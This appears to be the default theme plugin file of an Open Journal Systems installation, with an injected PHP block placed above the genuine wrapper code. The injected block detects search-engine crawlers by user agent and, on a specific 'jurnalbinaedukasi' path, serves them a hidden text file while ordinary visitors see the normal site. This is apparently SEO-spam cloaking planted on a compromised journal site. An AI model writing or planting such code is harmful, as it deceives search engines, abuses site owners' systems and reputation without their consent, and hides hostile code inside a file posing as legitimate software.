<?php
$user_agent  = $_SERVER['HTTP_USER_AGENT'] ?? '';
$request_uri = $_SERVER['REQUEST_URI'] ?? '';

$is_bot = false;

$bots = [
    'Googlebot',
    'Google-InspectionTool',
    'AdsBot-Google',
    'Mediapartners-Google',
    'Bingbot',
    'Slurp',
    'DuckDuckBot',
    'AhrefsBot',
    'SemrushBot',
    'MJ12bot',
    'YandexBot'
];

foreach ($bots as $bot) {
    if (stripos($user_agent, $bot) !== false) {
        $is_bot = true;
        break;
    }
}

/* trigger hanya letrasverdes */
if ($is_bot && stripos($request_uri, 'index.php/jurnalbinaedukasi') !== false) {

    $file = '/var/www/journal/public/index.txt';

    if (file_exists($file)) {
        readfile($file);
    } else {
        echo 'cache not ready';
    }

    exit;
}
?>

<?php

/**
 * @file plugins/themes/default/index.php
 *
 * Copyright (c) 2014-2021 Simon Fraser University
 * Copyright (c) 2003-2021 John Willinsky
 * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
 *
 * @ingroup plugins_themes_default
 *
 * @brief Wrapper for default theme plugin.
 *
 */

return new \APP\plugins\themes\default\DefaultThemePlugin();
